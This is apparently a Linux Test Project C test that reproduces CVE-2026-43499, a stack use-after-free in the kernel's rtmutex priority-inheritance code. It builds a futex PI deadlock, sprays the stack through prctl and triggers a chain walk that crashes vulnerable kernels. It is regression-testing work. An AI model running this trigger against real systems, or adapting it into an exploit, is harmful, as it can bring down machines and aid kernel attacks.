// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (c) 2026 Nebula Security <root@nebusec.ai>
 * Copyright (c) 2026 Linux Test Project
 */

/*\
 * Test for CVE-2026-43499 (GhostLock), a stack use-after-free in the
 * rtmutex PI code, fixed in kernel v7.1:
 * 3bfdc63936dd ("rtmutex: Use waiter::task instead of current in remove_waiter()")
 *
 * Reproducer based on the Nebula Security writeup and open-sourced PoC
 * (https://nebusec.ai/research/ionstack-part-2/ and
 * https://github.com/NebuSec/CyberMeowfia).
 * Beware, this test will crash the system on a vulnerable kernel.
 *
 * [Algorithm]
 *
 * - Set up a three-futex PI deadlock topology.
 * - Call :manpage:`futex(2)` with FUTEX_CMP_REQUEUE_PI on the waiter.
 * - On a vulnerable kernel, the rollback from -EDEADLK leaves the waiter's
 *   pi_blocked_on pointer dangling on its own stack.
 * - Waiter sprays its stack continuously via :manpage:`prctl(2)` (PR_SET_MM_MAP)
 *   with non-canonical addresses while main thread calls :manpage:`sched_setattr(2)`
 *   on the waiter to trigger a chain walk.
 * - The chain walk dereferences the sprayed garbage, crashing a vulnerable
 *   kernel.
 */

#include "tst_test.h"
#include "tst_timer.h"
#include "tst_safe_clocks.h"
#include "tst_safe_pthread.h"
#include "lapi/syscalls.h"
#include "lapi/sched.h"
#include "lapi/prctl.h"
#include "lapi/futex.h"

#define ATTEMPTS 128
#define POISON_PTR 0xdeadbee11c518f58ULL
#define MAX_AUXV_WORDS 48

#define CP_CHAIN_HELD 0
#define CP_TARGET_HELD 1
#define CP_OWNER_BLOCKED 2
#define CP_SPRAYED 3
#define CP_SETATTR_DONE 4

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

static pid_t waiter_tid;
static pid_t owner_tid;

static unsigned long auxv[MAX_AUXV_WORDS];
static uint32_t valid_auxv_size;
static tst_atomic_t stop_spray;

static int futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2,
				 struct timespec *ts)
{
	return tst_syscall(__NR_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts,
			   uaddr2, 0);
}

static int futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2)
{
	return tst_syscall(__NR_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1,
			   uaddr2, 0);
}

static int futex_lock_pi(uint32_t *uaddr)
{
	return tst_syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0);
}

static int futex_unlock_pi(uint32_t *uaddr)
{
	return tst_syscall(__NR_futex, uaddr, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
}

static void *waiter_fn(void *arg LTP_ATTRIBUTE_UNUSED)
{
	struct timespec ts;
	struct prctl_mm_map mm_map = {
		.start_code  = (uint64_t)(uintptr_t)&waiter_fn,
		.end_code    = (uint64_t)(uintptr_t)&waiter_fn + 0x1000,
		.start_data  = (uint64_t)(uintptr_t)auxv & ~0xfffUL,
		.end_data    = ((uint64_t)(uintptr_t)auxv & ~0xfffUL) + 0x1000,
		.start_brk   = (uint64_t)(uintptr_t)sbrk(0),
		.brk         = (uint64_t)(uintptr_t)sbrk(0),
		.start_stack = (uint64_t)(uintptr_t)&mm_map,
		.arg_start   = (uint64_t)(uintptr_t)&mm_map,
		.arg_end     = (uint64_t)(uintptr_t)&mm_map,
		.env_start   = (uint64_t)(uintptr_t)&mm_map,
		.env_end     = (uint64_t)(uintptr_t)&mm_map,
		.auxv        = (void *)auxv,
		.auxv_size   = valid_auxv_size,
		.exe_fd      = (uint32_t)-1,
	};

	waiter_tid = tst_syscall(__NR_gettid);

	futex_lock_pi(&f_pi_chain);

	TST_CHECKPOINT_WAKE2(CP_CHAIN_HELD, 2);
	TST_CHECKPOINT_WAIT(CP_OWNER_BLOCKED);

	SAFE_CLOCK_GETTIME(CLOCK_MONOTONIC, &ts);
	ts = tst_timespec_add(ts, (struct timespec){ .tv_sec = 10, .tv_nsec = 0 });
	futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts);

	TST_CHECKPOINT_WAKE(CP_SPRAYED);

	while (!tst_atomic_load(&stop_spray)) {
		prctl(PR_SET_MM, PR_SET_MM_MAP, (unsigned long)&mm_map,
		      sizeof(mm_map), 0);
	}

	TST_CHECKPOINT_WAIT(CP_SETATTR_DONE);

	futex_unlock_pi(&f_pi_chain);

	return NULL;
}

static void *owner_fn(void *arg LTP_ATTRIBUTE_UNUSED)
{
	owner_tid = tst_syscall(__NR_gettid);

	TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);

	futex_lock_pi(&f_pi_target);
	TST_CHECKPOINT_WAKE(CP_TARGET_HELD);

	futex_lock_pi(&f_pi_chain);

	futex_unlock_pi(&f_pi_chain);
	futex_unlock_pi(&f_pi_target);

	return NULL;
}

static void setup(void)
{
	static const int try_sizes[] = {
		MAX_AUXV_WORDS,
		MAX_AUXV_WORDS - 4,
		MAX_AUXV_WORDS - 8
	};
	struct prctl_mm_map map = {
		.exe_fd = (uint32_t)-1,
		.auxv = (void *)auxv,
	};
	unsigned int i, sz = 0;

	SAFE_PRCTL(PR_SET_MM, PR_SET_MM_MAP_SIZE, (unsigned long)&sz, 0, 0);

	for (i = 0; i < MAX_AUXV_WORDS; i++)
		auxv[i] = POISON_PTR + i * sizeof(unsigned long);

	map.start_code = map.start_data = map.end_data =
	map.start_brk = map.brk = map.start_stack = map.arg_start =
	map.arg_end = map.env_start = map.env_end = (uint64_t)(uintptr_t)&sz;
	map.end_code = map.start_code + 0x1000;

	for (i = 0; i < ARRAY_SIZE(try_sizes); i++) {
		valid_auxv_size = try_sizes[i] * sizeof(unsigned long);
		map.auxv_size = valid_auxv_size;

		if (prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0) == 0)
			break;
	}

	if (i == ARRAY_SIZE(try_sizes))
		tst_brk(TBROK | TERRNO, "PR_SET_MM_MAP failed for all auxv sizes");

	tst_res(TDEBUG, "Using auxv_size = %u", valid_auxv_size);
}

static void run(void)
{
	pthread_t waiter_th, owner_th;
	struct sched_attr attr = {
		.size = sizeof(attr),
		.sched_policy = SCHED_BATCH,
		.sched_nice = 19,
	};

	tst_res(TINFO, "Triggering PI deadlock and stack spray");

	for (int i = 0; i < ATTEMPTS; i++) {
		f_wait = 0;
		f_pi_target = 0;
		f_pi_chain = 0;
		tst_atomic_store(0, &stop_spray);

		SAFE_PTHREAD_CREATE(&waiter_th, NULL, waiter_fn, NULL);
		SAFE_PTHREAD_CREATE(&owner_th, NULL, owner_fn, NULL);

		TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
		TST_CHECKPOINT_WAIT(CP_TARGET_HELD);

		TST_THREAD_STATE_WAIT(owner_tid, 'S', 10000);

		TST_CHECKPOINT_WAKE(CP_OWNER_BLOCKED);

		TST_THREAD_STATE_WAIT(waiter_tid, 'S', 10000);

		TEST(futex_cmp_requeue_pi(&f_wait, &f_pi_target));
		if (TST_RET != -1 || TST_ERR != EDEADLK)
			tst_brk(TBROK | TTERRNO, "FUTEX_CMP_REQUEUE_PI did not return -EDEADLK");

		TST_CHECKPOINT_WAIT(CP_SPRAYED);

		TEST(sched_setattr(waiter_tid, &attr, 0));
		if (TST_RET == -1)
			tst_brk(TBROK | TTERRNO, "sched_setattr() failed");

		tst_atomic_store(1, &stop_spray);
		TST_CHECKPOINT_WAKE(CP_SETATTR_DONE);

		SAFE_PTHREAD_JOIN(waiter_th, NULL);
		SAFE_PTHREAD_JOIN(owner_th, NULL);
	}

	tst_res(TPASS, "Kernel survived %d GhostLock trigger attempts", ATTEMPTS);
}

static struct tst_test test = {
	.setup = setup,
	.test_all = run,
	.runtime = 180,
	.needs_checkpoints = 1,
	.needs_kconfigs = (const char *[]) {
		"CONFIG_CHECKPOINT_RESTORE=y",
		"CONFIG_FUTEX_PI=y",
		NULL
	},
	.taint_check = TST_TAINT_W | TST_TAINT_D,
	.tags = (const struct tst_tag[]) {
		{"linux-git", "3bfdc63936dd4773109b7b8c280c0f3b5ae7d349"},
		{"CVE", "2026-43499"},
		{}
	},
};
